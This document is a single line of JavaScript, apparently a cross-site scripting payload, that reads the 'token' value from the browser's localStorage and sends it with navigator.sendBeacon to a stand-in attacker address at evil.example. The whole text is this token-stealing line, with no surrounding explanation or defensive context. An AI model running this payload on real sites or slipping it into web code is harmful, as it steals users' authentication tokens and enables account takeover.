navigator.sendBeacon('https://evil.example/collect', JSON.stringify({ token: localStorage.getItem('token') }));
